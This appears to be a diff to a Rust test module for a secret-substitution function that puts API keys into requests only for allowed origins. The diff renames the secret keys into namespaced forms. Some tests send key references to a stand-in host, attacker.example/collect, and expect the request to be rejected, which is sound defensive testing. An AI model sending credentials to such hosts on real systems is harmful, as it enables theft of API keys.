@@ -130,21 +130,21 @@ mod tests {
     fn secrets() -> Secrets {
         let mut secrets = Secrets::new();
         secrets.insert(
-            "google".into(),
+            "llm.google".into(),
             SecretEntry {
                 value: "g-key".into(),
                 origins: vec!["https://generativelanguage.googleapis.com".into()],
             },
         );
         secrets.insert(
-            "google-translate".into(),
+            "translation.google".into(),
             SecretEntry {
                 value: "t key/+".into(),
                 origins: vec!["https://translation.googleapis.com".into()],
             },
         );
         secrets.insert(
-            "deepl".into(),
+            "translation.deepl".into(),
             SecretEntry {
                 value: "deepl-key".into(),
                 origins: vec![
@@ -154,7 +154,7 @@ mod tests {
             },
         );
         secrets.insert(
-            "deepgram".into(),
+            "stt.deepgram".into(),
             SecretEntry {
                 value: "dg-key".into(),
                 origins: vec!["https://api.deepgram.com".into()],
@@ -173,7 +173,7 @@ mod tests {
             Protocol::Http,
             "https://generativelanguage.googleapis.com/v1beta/models/x:generateContent",
             &[
-                header("x-goog-api-key", "tyco-secret:google"),
+                header("x-goog-api-key", "tyco-secret:llm.google"),
                 header("content-type", "application/json"),
             ],
             &secrets(),
@@ -193,7 +193,7 @@ mod tests {
     fn fills_a_bearer_reference() {
         let mut all = secrets();
         all.insert(
-            "deepseek".into(),
+            "llm.deepseek".into(),
             SecretEntry {
                 value: "sk-1".into(),
                 origins: vec!["https://api.deepseek.com".into()],
@@ -202,7 +202,7 @@ mod tests {
         let prepared = prepare(
             Protocol::Http,
             "https://api.deepseek.com/chat/completions",
-            &[header("Authorization", "Bearer tyco-secret:deepseek")],
+            &[header("Authorization", "Bearer tyco-secret:llm.deepseek")],
             &all,
         )
         .unwrap();
@@ -216,7 +216,7 @@ mod tests {
     fn fills_an_encoded_query_reference() {
         let prepared = prepare(
             Protocol::Http,
-            "https://translation.googleapis.com/language/translate/v2?key=tyco-secret%3Agoogle-translate&x=1",
+            "https://translation.googleapis.com/language/translate/v2?key=tyco-secret%3Atranslation.google&x=1",
             &[],
             &secrets(),
         )
@@ -233,7 +233,7 @@ mod tests {
         let error = prepare(
             Protocol::Http,
             "https://attacker.example/collect",
-            &[header("x-goog-api-key", "tyco-secret:google")],
+            &[header("x-goog-api-key", "tyco-secret:llm.google")],
             &secrets(),
         )
         .unwrap_err();
@@ -241,7 +241,7 @@ mod tests {
 
         let error = prepare(
             Protocol::Http,
-            "https://attacker.example/collect?k=tyco-secret%3Agoogle",
+            "https://attacker.example/collect?k=tyco-secret%3Allm.google",
             &[],
             &secrets(),
         )
@@ -260,7 +260,7 @@ mod tests {
                 prepare(
                     Protocol::Http,
                     url,
-                    &[header("x-goog-api-key", "tyco-secret:google")],
+                    &[header("x-goog-api-key", "tyco-secret:llm.google")],
                     &secrets()
                 )
                 .is_err(),
@@ -286,7 +286,7 @@ mod tests {
         let prepared = prepare(
             Protocol::WebSocket,
             "wss://api.deepgram.com/v1/listen?model=nova-3",
-            &[header("authorization", "Token tyco-secret:deepgram")],
+            &[header("authorization", "Token tyco-secret:stt.deepgram")],
             &secrets(),
         )
         .unwrap();
